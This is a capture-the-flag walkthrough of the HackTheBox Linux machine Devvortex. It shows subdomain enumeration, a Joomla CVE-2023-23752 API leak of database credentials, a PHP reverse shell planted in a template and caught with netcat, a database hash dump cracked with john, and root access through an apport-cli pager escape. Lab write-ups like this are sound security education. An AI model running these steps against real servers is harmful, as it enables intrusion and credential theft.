---
layout: post
title: HackTheBox Devvortex
date: 2023-11-25
tags: [HackTheBox, Linux]
---

# Machine Synopsis

Devvortex is an easy-difficulty Linux machine that features a Joomla CMS that is vulnerable to information disclosure. Accessing the service&amp;#039;s configuration file reveals plaintext credentials that lead to Administrative access to the Joomla instance. With administrative access, the Joomla template is modified to include malicious PHP code and gain a shell. After gaining a shell and enumerating the database contents, hashed credentials are obtained, which are cracked and lead to SSH access to the machine. Post-exploitation enumeration reveals that the user is allowed to run apport-cli as root, which is leveraged to obtain a root shell. ([Source](https://app.hackthebox.com/machines/Devvortex/information))

# Enumeration

```bash
$ nmap -sC -sV 10.10.11.242
Starting Nmap 7.94SVN ( https://nmap.org )
Nmap scan report for 10.10.11.242
Host is up (0.0048s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.9 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   3072 48:ad:d5:b8:3a:9f:bc:be:f7:e8:20:1e:f6:bf:de:ae (RSA)
|   256 b7:89:6c:0b:20:ed:49:b2:c1:86:7c:29:92:74:1c:1f (ECDSA)
|_  256 18:cd:9d:08:a6:21:a8:b8:b6:f7:9f:8d:40:51:54:fb (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://devvortex.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.72 seconds
```

Here is their website.

![webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Devvortex/webpage.png?raw=true)

There was nothing much on their website so lets run `gobuster` to search for any hidden directories.

```bash
$ gobuster dir -u http://devvortex.htb -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-small.txt -t 50 -q
/images               (Status: 301) [Size: 178] [--> http://devvortex.htb/images/]
/css                  (Status: 301) [Size: 178] [--> http://devvortex.htb/css/]
/js                   (Status: 301) [Size: 178] [--> http://devvortex.htb/js/]
```

There was nothing interesting from normal directory enumeration. Let’s enumerate for subdomains.

```bash
$ gobuster vhost -u http://devvortex.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt --append-domain -q
Found: dev.devvortex.htb Status: 200 [Size: 23221]
```

![dev_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Devvortex/dev_webpage.png?raw=true)

There was nothing much on their dev website but there were some interesting stuff on their `/robots.txt` webpage.

```
# If the Joomla site is installed within a folder
# eg www.example.com/joomla/ then the robots.txt file
# MUST be moved to the site root
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths.
# eg the Disallow rule for the /administrator/ folder MUST
# be changed to read
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# https://www.robotstxt.org/orig.html

User-agent: *
Disallow: /administrator/
Disallow: /api/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

Lets visit the `/administrator` endpoint.

![dev_administrator_webpage](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Devvortex/dev_administrator_webpage.png?raw=true)

It looks like a Joomla webapp. Default credentials didn’t work.

There was a `/README.txt` and it revealed the Joomla version.

![dev_readme](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Devvortex/dev_readme.png?raw=true)

This Joomla version is vulnerable to [CVE-2023-23752](https://www.exploit-db.com/exploits/51334). According to the exploit, we can query `"#{root_url}/api/index.php/v1/users?public=true"` for the users and `"#{root_url}/api/index.php/v1/config/application?public=true"` for the users config.

```bash
$ curl "http://dev.devvortex.htb/api/index.php/v1/users?public=true" | jq .
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/users?public=true"
  },
  "data": [
    {
      "type": "users",
      "id": "649",
      "attributes": {
        "id": 649,
        "name": "lewis",
        "username": "lewis",
        "email": "lewis@devvortex.htb",
		...
        "group_names": "Super Users"
      }
    },
    {
      "type": "users",
      "id": "650",
      "attributes": {
        "id": 650,
        "name": "logan paul",
        "username": "logan",
        "email": "logan@devvortex.htb",
		...
        "group_names": "Registered"
      }
    }
  ],
  "meta": {
    "total-pages": 1
  }
}
```

There are 2 users: `lewis` and `logan`.

```bash
$ curl "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true" | jq .
{
  "links": {
    "self": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true",
    "next": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=20&page%5Blimit%5D=20",
    "last": "http://dev.devvortex.htb/api/index.php/v1/config/application?public=true&page%5Boffset%5D=60&page%5Blimit%5D=20"
  },
  "data": [
  ...
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbtype": "mysqli",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "host": "localhost",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "user": "lewis",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "password": "P4ntherg0t1n5r3c0n##",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "db": "joomla",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbprefix": "sd4fg_",
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbencryption": 0,
        "id": 224
      }
    },
    {
      "type": "application",
      "id": "224",
      "attributes": {
        "dbsslverifyservercert": false,
        "id": 224
      }
    }
  ],
  "meta": {
    "total-pages": 4
  }
}
```

There are a few important information from the config: `dbtype = mysqli`, `host = localhost` and `password = P4ntherg0t1n5r3c0n##`.

# Exploitation

Lets login to the Joomla dashboard with `lewis` credentials.

![joomla_dashboard](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Devvortex/joomla_dashboard.png?raw=true)

The most interesting target in the Joomla dashboard is the administrator templates under the system tab.

![joomla_dashboard_system](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Devvortex/joomla_dashboard_system.png?raw=true)

![joomla_dashboard_administrator_templates](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Devvortex/joomla_dashboard_administrator_templates.png?raw=true)

![joomla_dashboard_administrator_templates_2](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Devvortex/joomla_dashboard_administrator_templates_2.png?raw=true)

Placed a malicious PHP reverse shell code into `error.php` and saved the page.

![joomla_dashboard_administrator_templates_reverseshell](https://github.com/blankshiro/blankshiro.github.io/blob/main/assets/img/HackTheBox/Devvortex/joomla_dashboard_administrator_templates_reverseshell.png?raw=true)

Start a listener and call the `error.php` page.

```bash
$ curl "http://dev.devvortex.htb/administrator/templates/atum/error.php"
```

```bash
$ nc -nlvp 9999
listening on [any] 9999 ...
connect to [10.10.14.16] from (UNKNOWN) [10.10.11.242] 57428
bash: cannot set terminal process group (853): Inappropriate ioctl for device
bash: no job control in this shell
www-data@devvortex:~/dev.devvortex.htb/administrator/templates/atum$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

With a shell access, we can access the internal `mysql` database with `lewis` credentials again.

```bash
www-data@devvortex:/home/logan$ mysql -h 127.0.0.1 -u lewis -p
Enter password: P4ntherg0t1n5r3c0n##
...
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| joomla             |
| performance_schema |
+--------------------+

mysql> use joomla;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
show tables;
+-------------------------------+
| Tables_in_joomla              |
+-------------------------------+
...
| sd4fg_user_keys               |
| sd4fg_user_mfa                |
| sd4fg_user_notes              |
| sd4fg_user_profiles           |
| sd4fg_user_usergroup_map      |
| sd4fg_usergroups              |
| sd4fg_users                   |
...

mysql> select username, password from sd4fg_users; 
+----------+--------------------------------------------------------------+
| username | password                                                     |
+----------+--------------------------------------------------------------+
| lewis    | $2y$10$6V52x.SD8Xc7hNlVwUTrI.ax4BIAYuhVBMVvnYWRceBmy8XdEzm1u |
| logan    | $2y$10$IT4k5kmSGvHSO9d6M/1w0eYiB5Ne9XzArQRFJTGThNiy/yBtkIj12 |
+----------+--------------------------------------------------------------+
```

Found password hash for `logan`.

```bash
$ john logan_hash --wordlist=/usr/share/wordlists/rockyou.txt
...
tequieromucho    (?)  
Session completed. 
```

Cracked `logan` hash with `john`. SSH login with `logan` credentials.

```bash
$ ssh logan@10.10.11.242
logan@10.10.11.242's password: 
...
logan@devvortex:~$ 
```

# Privilege Escalation

Check what privileges does `logan` have.

```bash
logan@devvortex:~$ sudo -l
[sudo] password for logan: 
Matching Defaults entries for logan on devvortex:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User logan may run the following commands on devvortex:
    (ALL : ALL) /usr/bin/apport-cli
```

`logan` has the privilege to run `sudo` for `/usr/bin/apport-cli`.

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli --help
Usage: apport-cli [options] [symptom|pid|package|program path|.apport/.crash file]

Options:
  -h, --help            show this help message and exit
  -f, --file-bug        Start in bug filing mode. Requires --package and an
                        optional --pid, or just a --pid. If neither is given,
                        display a list of known symptoms. (Implied if a single
                        argument is given.)
  -w, --window          Click a window as a target for filing a problem
                        report.
  -u UPDATE_REPORT, --update-bug=UPDATE_REPORT
                        Start in bug updating mode. Can take an optional
                        --package.
  -s SYMPTOM, --symptom=SYMPTOM
                        File a bug report about a symptom. (Implied if symptom
                        name is given as only argument.)
  -p PACKAGE, --package=PACKAGE
                        Specify package name in --file-bug mode. This is
                        optional if a --pid is specified. (Implied if package
                        name is given as only argument.)
  -P PID, --pid=PID     Specify a running program in --file-bug mode. If this
                        is specified, the bug report will contain more
                        information.  (Implied if pid is given as only
                        argument.)
  --hanging             The provided pid is a hanging application.
  -c PATH, --crash-file=PATH
                        Report the crash from given .apport or .crash file
                        instead of the pending ones in /var/crash. (Implied if
                        file is given as only argument.)
  --save=PATH           In bug filing mode, save the collected information
                        into a file instead of reporting it. This file can
                        then be reported later on from a different machine.
  --tag=TAG             Add an extra tag to the report. Can be specified
                        multiple times.
  -v, --version         Print the Apport version number.
```

Check out the version of this `cli`.

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli -v
2.20.11
```

This version seemed to be vulnerable to [CVE-2023-1326](https://github.com/diego-tella/CVE-2023-1326-PoC). To execute this, we have to view a report and then execute `!/bin/bash`. Since there was no report files in `/var/crash/` as per the PoC, we can create a new report using the cli.

```bash
logan@devvortex:~$ sudo /usr/bin/apport-cli -f

*** What kind of problem do you want to report?


Choices:
  1: Display (X.org)
  2: External or internal storage devices (e. g. USB sticks)
  3: Security related problems
  4: Sound/audio related problems
  5: dist-upgrade
  6: installation
  7: installer
  8: release-upgrade
  9: ubuntu-release-upgrader
  10: Other problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/9/10/C): 1


*** Collecting problem information

The collected information can be sent to the developers to improve the
application. This might take a few minutes.

*** What display problem do you observe?


Choices:
  1: I don't know
  2: Freezes or hangs during boot or usage
  3: Crashes or restarts back to login screen
  4: Resolution is incorrect
  5: Shows screen corruption
  6: Performance is worse than expected
  7: Fonts are the wrong size
  8: Other display-related problem
  C: Cancel
Please choose (1/2/3/4/5/6/7/8/C): 2

*** 

To debug X freezes, please see https://wiki.ubuntu.com/X/Troubleshooting/Freeze

Press any key to continue... 

.dpkg-query: no packages found matching xorg
..................

*** Send problem report to the developers?

After the problem report has been sent, please fill out the form in the
automatically opened web browser.

What would you like to do? Your options are:
  S: Send report (1.4 KB)
  V: View report
  K: Keep report file for sending later or copying to somewhere else
  I: Cancel and ignore future crashes of this program version
  C: Cancel
Please choose (S/V/K/I/C): V
```

At this point, we will be brought to a vim viewer. According to the PoC, we just have to enter `!/bin/bash` in the vim viewer to exit into a root shell.

```bash
# !/bin/bash in the vim viewer
root@devvortex:/home/logan# 
```

